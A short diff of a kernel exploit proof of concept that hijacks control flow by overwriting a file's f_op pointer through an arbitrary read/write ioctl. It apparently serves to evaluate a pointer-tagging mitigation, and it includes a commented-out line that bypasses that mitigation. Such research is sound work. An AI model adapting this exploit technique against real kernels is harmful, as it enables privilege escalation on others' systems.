@@ -1,4 +1,4 @@
-// FZY: Control-flow hijacking PoC that overwrites file->f_op (an indirect function pointer),
+// SDP: Control-flow hijacking PoC that overwrites file->f_op (an indirect function pointer),
 // redirecting it to a fake file_operations struct written into the kernel via the arbrw ioctl.
 //
 // Attack chain:
@@ -77,7 +77,7 @@ static unsigned long follow_ptr(int fd, unsigned long ptr_addr, int mode,
   printf("[+] %s @ 0x%lx = 0x%lx\n", label, ptr_addr, val);
   if (mode != 0) {
     printf("[+]   SDP mode: tagged value -> 0x%lx\n", val);
-    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
+    // Enable to bypass the mitigation and evaluate if the rest steps work correctly
     // val |= 0xFFFF000000000000UL;
   }
   return val;
